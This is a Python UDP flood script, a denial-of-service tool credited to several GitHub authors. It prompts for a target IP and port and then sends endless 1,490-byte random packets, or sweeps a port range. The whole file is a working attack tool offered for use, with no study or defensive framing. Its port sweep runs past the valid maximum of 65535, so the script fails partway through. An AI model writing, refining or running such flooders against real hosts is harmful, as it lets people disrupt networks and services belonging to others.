import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("cls")
print("Author   : HA-MRX")
print("Converted to Windows and Python3 by UltraHackerDog")
print("Changed system to send more attack by juwonjun")
print("Author Github   : https://github.com/Ha3MrX")
print("Editor Github   : https://github.com/UltraHackerDog")
print("Editor's Editor Github   : https://github.com/juwonjun")
print("-" * 50)
ip = input("IP Target : ")

port_input = input("Port (Leave empty for automatic port range 1-99999): ")

if port_input == "":
    print("No port specified. Using ports from 1 to 99999.")
    port = None
else:
    port = int(port_input)

os.system("cls")
print("[====================] 100%")
time.sleep(3)
sent = 0

while True:
    try:
        if port is None:
            for port in range(1, 100000):
                sock.sendto(bytes, (ip, port))
                sent += 1
                print(f"Sent {sent} packet(s) to {ip} through port:{port}")
        else:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print(f"Sent {sent} packet(s) to {ip} through port:{port}")

    except Exception as e:
        print(f"Error sending packet: {e}")
        break
